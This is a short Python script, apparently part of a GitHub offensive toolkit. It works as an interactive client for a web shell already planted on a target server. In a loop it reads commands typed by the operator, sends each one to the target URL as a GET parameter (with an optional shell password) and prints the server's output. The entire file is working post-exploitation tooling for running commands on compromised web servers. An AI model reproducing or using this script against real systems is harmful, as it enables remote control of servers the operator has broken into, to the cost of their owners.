# Author Patrick Story
# https://github.com/Patchyst
# https://github.com/Patchyst/PatchyPack
import requests
from termcolor import cprint
import argparse
arg_parser = argparse.ArgumentParser()
arg_parser.add_argument("target_url", help="The target URL")
arg_parser.add_argument("shell_name", help="Name of shell")
arg_parser.add_argument("--password", help="password for shell")
args = arg_parser.parse_args()
m = str('Connecting to ' + args.shell_name + ' at ' + args.target_url)
cprint(m, color="red", attrs=["bold"])
while True:
    if args.password:
        try:
            req = requests.get(args.target_url, params={'password': args.password, args.shell_name: str(input(str(args.shell_name)))})
            print(req.text)
        except:
            print("except 1")
            exit(1)
    else:
        try:
            req = requests.get(args.target_url, params={args.shell_name: str(input(str(args.shell_name)))})
            print(req.text)
        except:
            print("except 2")
            exit(1)
